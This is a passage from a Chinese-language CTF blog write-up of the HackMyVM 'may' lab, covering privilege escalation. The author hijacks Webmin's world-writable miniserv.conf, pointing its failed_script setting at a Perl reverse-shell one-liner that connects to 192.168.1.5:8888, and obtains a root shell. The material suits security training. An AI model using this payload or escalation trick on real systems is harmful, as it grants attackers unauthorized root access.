class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line">marie@may:~$ find / -name &quot;webmin&quot; 2&gt;/dev/null</span><br><span class="line">/etc/init.d/webmin</span><br><span class="line">/etc/pam.d/webmin</span><br><span class="line">/etc/webmin</span><br><span class="line">/etc/webmin/webmin</span><br><span class="line">/usr/share/doc/webmin</span><br><span class="line">/usr/share/webmin</span><br><span class="line">/usr/share/webmin/bin/webmin</span><br><span class="line">/usr/share/webmin/gray-theme/webmin</span><br><span class="line">/usr/share/webmin/webmin</span><br><span class="line">/usr/share/webmin/authentic-theme/images/modules/webmin</span><br><span class="line">/usr/share/webmin/authentic-theme/images/favicons/webmin</span><br><span class="line">/usr/bin/webmin</span><br><span class="line">/run/lock/subsys/webmin</span><br><span class="line">/var/webmin</span><br><span class="line">marie@may:~$ cd /etc/webmin</span><br><span class="line">marie@may:/etc/webmin$ ls</span><br><span class="line">acl               cluster-useradmin  fetchmail          installed.cache  logrotate       package-updates  quota         squid          useradmin</span><br><span class="line">adsl-client       cluster-usermin    filemin            ipfilter         lpadmin         pam              raid          sshd           usermin</span><br><span class="line">ajaxterm          cluster-webmin     filter             ipfw             lvm             pap              reload        start          var-path</span><br><span class="line">apache            config             firewall           ipsec            mailboxes       passwd           restart       status         version</span><br><span class="line">at                cpan               firewall6          iscsi-client     mailcap         perl-path        samba         stop           vgetty</span><br><span class="line">backup-config     cron               firewalld          iscsi-server     man             phpini           sarg          stunnel        webalizer</span><br><span class="line">bacula-backup     custom             first-install      iscsi-target     miniserv.conf   postfix          sendmail      syslog         webmin</span><br><span class="line">bandwidth         dfsadmin           fsdump             iscsi-tgtd       miniserv.pem    postgresql       servers       syslog-ng      webmin.acl</span><br><span class="line">bind8             dhcpd              grub               jabber           miniserv.users  ppp-client       shell         system-status  webmincron</span><br><span class="line">change-user       dovecot            heartbeat          krb5             mon             pptp-client      shorewall     tcpwrappers    webminlog</span><br><span class="line">cluster-copy      exim               htaccess-htpasswd  ldap-client      mount           pptp-server      shorewall6    telnet         wuftpd</span><br><span class="line">cluster-cron      exports            idmapd             ldap-server      mysql           proc             smart-status  time           xinetd</span><br><span class="line">cluster-passwd    fail2ban           inetd              ldap-useradmin   net             procmail         smf           tunnel</span><br><span class="line">cluster-shell     failed.pl          init               login.pl         nis             proftpd          software      uninstall.sh</span><br><span class="line">cluster-software  fdisk              inittab            logout.pl        openslp         qmailadmin       spam          updown</span><br><span class="line">marie@may:/etc/webmin$ ls -la</span><br><span class="line">total 536</span><br><span class="line">drwxr-xr-x 116 root root 4096 Feb 21 11:01 .</span><br><span class="line">drwxr-xr-x  74 root root 4096 Feb 21 10:21 ..</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 acl</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 adsl-client</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 ajaxterm</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 apache</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 at</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 backup-config</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 bacula-backup</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 bandwidth</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 bind8</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 change-user</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 cluster-copy</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 cluster-cron</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 cluster-passwd</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 cluster-shell</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 cluster-software</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 cluster-useradmin</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 cluster-usermin</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 cluster-webmin</span><br><span class="line">-rw-r--r--   1 root root  427 Jul 22  2021 config</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 cpan</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 cron</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 custom</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 dfsadmin</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 dhcpd</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 dovecot</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 exim</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 exports</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 fail2ban</span><br><span class="line">-rwxr-xr-x   1 root root  496 Jul 22  2021 failed.pl</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 fdisk</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 fetchmail</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 filemin</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 filter</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 firewall</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 firewall6</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 firewalld</span><br><span class="line">-rw-r--r--   1 root root   14 Jul 22  2021 first-install</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 fsdump</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 grub</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 heartbeat</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 htaccess-htpasswd</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 idmapd</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 inetd</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 init</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 inittab</span><br><span class="line">-rw-r--r--   1 root root 1174 Jul 22  2021 installed.cache</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 ipfilter</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 ipfw</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 ipsec</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 iscsi-client</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 iscsi-server</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 iscsi-target</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 iscsi-tgtd</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 jabber</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 krb5</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 ldap-client</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 ldap-server</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 ldap-useradmin</span><br><span class="line">-rwxr-xr-x   1 root root  494 Jul 22  2021 login.pl</span><br><span class="line">-rwxr-xr-x   1 root root  496 Jul 22  2021 logout.pl</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 logrotate</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 lpadmin</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 lvm</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 mailboxes</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 mailcap</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 man</span><br><span class="line">-rw----rw-   1 root bin   979 Feb 21 11:01 miniserv.conf</span><br><span class="line">-rw-------   1 root bin  2957 Jul 22  2021 miniserv.pem</span><br><span class="line">-rw-------   1 root bin     9 Jul 22  2021 miniserv.users</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 mon</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 mount</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 mysql</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 net</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 nis</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 openslp</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 package-updates</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 pam</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 pap</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 passwd</span><br><span class="line">-rw-r--r--   1 root root   14 Jul 22  2021 perl-path</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 phpini</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 postfix</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 postgresql</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 ppp-client</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 pptp-client</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 pptp-server</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 proc</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 procmail</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 proftpd</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 qmailadmin</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 quota</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 raid</span><br><span class="line">-rwxr-xr-x   1 root root  164 Jul 22  2021 reload</span><br><span class="line">-rwxr-xr-x   1 root root   55 Jul 22  2021 restart</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 samba</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 sarg</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 sendmail</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 servers</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 shell</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 shorewall</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 shorewall6</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 smart-status</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 smf</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 software</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 spam</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 squid</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 sshd</span><br><span class="line">-rwxr-xr-x   1 root root  234 Jul 22  2021 start</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 status</span><br><span class="line">-rwxr-xr-x   1 root root  359 Jul 22  2021 stop</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 stunnel</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 syslog</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 syslog-ng</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 system-status</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 tcpwrappers</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 telnet</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 time</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 tunnel</span><br><span class="line">-rwxr-xr-x   1 root root  198 Jul 22  2021 uninstall.sh</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 updown</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 useradmin</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 usermin</span><br><span class="line">-rw-r--r--   1 root root   12 Jul 22  2021 var-path</span><br><span class="line">-rw-r--r--   1 root root    6 Jul 22  2021 version</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 vgetty</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 webalizer</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 webmin</span><br><span class="line">-rw-------   1 root root  997 Jul 22  2021 webmin.acl</span><br><span class="line">drwx--x--x   3 root bin  4096 Jul 22  2021 webmincron</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 webminlog</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 wuftpd</span><br><span class="line">drwx--x--x   2 root bin  4096 Jul 22  2021 xinetd</span><br></pre></td></tr></table></figure>

<p><strong>发现一个我们可以编辑的配置文件，关于webmin的，而且这个webmin大概是以root身份启动的</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root      1016   556  0 12:27 ?        00:00:00 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf</span><br><span class="line">root      1017   556  0 12:27 ?        00:00:00 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">marie@may:/etc/webmin$ cat miniserv.conf</span><br><span class="line">port=10000</span><br><span class="line">root=/usr/share/webmin</span><br><span class="line">mimetypes=/usr/share/webmin/mime.types</span><br><span class="line">addtype_cgi=internal/cgi</span><br><span class="line">realm=Webmin Server</span><br><span class="line">logfile=/var/webmin/miniserv.log</span><br><span class="line">errorlog=/var/webmin/miniserv.error</span><br><span class="line">pidfile=/var/webmin/miniserv.pid</span><br><span class="line">logtime=168</span><br><span class="line">ssl=1</span><br><span class="line">no_ssl2=1</span><br><span class="line">no_ssl3=1</span><br><span class="line">no_tls1=1</span><br><span class="line">no_tls1_1=1</span><br><span class="line">ssl_honorcipherorder=1</span><br><span class="line">no_sslcompression=1</span><br><span class="line">env_WEBMIN_CONFIG=/etc/webmin</span><br><span class="line">env_WEBMIN_VAR=/var/webmin</span><br><span class="line">atboot=1</span><br><span class="line">logout=/etc/webmin/logout-flag</span><br><span class="line">listen=10000</span><br><span class="line">denyfile=\.pl$</span><br><span class="line">log=1</span><br><span class="line">blockhost_failures=5</span><br><span class="line">blockhost_time=60</span><br><span class="line">syslog=1</span><br><span class="line">ipv6=1</span><br><span class="line">session=1</span><br><span class="line">premodules=WebminCore</span><br><span class="line">server=MiniServ/1.979</span><br><span class="line">userfile=/etc/webmin/miniserv.users</span><br><span class="line">keyfile=/etc/webmin/miniserv.pem</span><br><span class="line">passwd_file=/etc/shadow</span><br><span class="line">passwd_uindex=0</span><br><span class="line">passwd_pindex=1</span><br><span class="line">passwd_cindex=2</span><br><span class="line">passwd_mindex=4</span><br><span class="line">passwd_mode=0</span><br><span class="line">preroot=authentic-theme</span><br><span class="line">passdelay=1</span><br><span class="line">failed_script=/etc/webmin/failed.pl</span><br><span class="line">logout_script=/etc/webmin/logout.pl</span><br><span class="line">cipher_list_def=1</span><br><span class="line">login_script=/etc/webmin/login.pl</span><br><span class="line">sudo=1</span><br><span class="line">error_handler_403=403.cgi</span><br><span class="line">error_handler_404=404.cgi</span><br><span class="line">error_handler_401=401.cgi</span><br></pre></td></tr></table></figure>

<p><strong>这个我们可以编辑的配置文件中，failed_script参数指的是当我们登录失败时执行的pl脚本，那我们将其改为反弹shell的脚本，然后在失败登录一次即可</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">marie@may:~$ cat 1.pl </span><br><span class="line">perl -e &#x27;use Socket;$i=&quot;192.168.1.5&quot;;$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/bash -i&quot;);&#125;;&#x27;</span><br><span class="line">marie@may:~$ chmod +x 1.pl</span><br><span class="line">marie@may:~$ nano /etc/webmin/miniserv.conf </span><br><span class="line">marie@may:~$ sudo /usr/sbin/reboot</span><br></pre></td></tr></table></figure>

<p><img src="/2025/02/22/hack-my-vm-may/5.png" alt="5"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  nc -lvnp 8888                                                          [1:42:33]</span><br><span class="line">listening on [any] 8888 ...</span><br><span class="line">connect to [192.168.1.5] from (UNKNOWN) [192.168.1.59] 40070</span><br><span class="line">bash: cannot set terminal process group (389): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">root@may:/usr/share/webmin# id</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@may:/usr/share/webmin# </span><br></pre></td></tr></table></figure>


  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">总览</a></li>
         
          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
         
          <li><a href="/tags/PWN/">CTF-PWN</a></li>
         
          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
         
          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
         
          <li><a href="/tags/Vulhub">Vulhub</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">hack-my-vm-may</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.2.</span> <span class="toc-text">80端口渗透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.3.</span> <span class="toc-text">提权</span></a></li></ol></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/02/22/hack-my-vm-may/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/02/22/hack-my-vm-may/&text=hack-my-vm-may"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/02/22/hack-my-vm-may/&title=hack-my-vm-may"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/02/22/hack-my-vm-may/&is_video=false&description=hack-my-vm-may"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=hack-my-vm-may&body=Check out this article: http://example.com/2025/02/22/hack-my-vm-may/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/02/22/hack-my-vm-may/&title=hack-my-vm-may"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/02/22/hack-my-vm-may/&title=hack-my-vm-may"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/02/22/hack-my-vm-may/&title=hack-my-vm-may"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/02/22/hack-my-vm-may/&title=hack-my-vm-may"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/02/22/hack-my-vm-may/&name=hack-my-vm-may&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/02/22/hack-my-vm-may/&t=hack-my-vm-may"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2025
    SunRT
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">总览</a></li>
         
          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
         
          <li><a href="/tags/PWN/">CTF-PWN</a></li>
         
          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
         
          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
         
          <li><a href="/tags/Vulhub">Vulhub</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"In die Zwischenablage kopiert!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Kopiert!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->


</body>
</html>
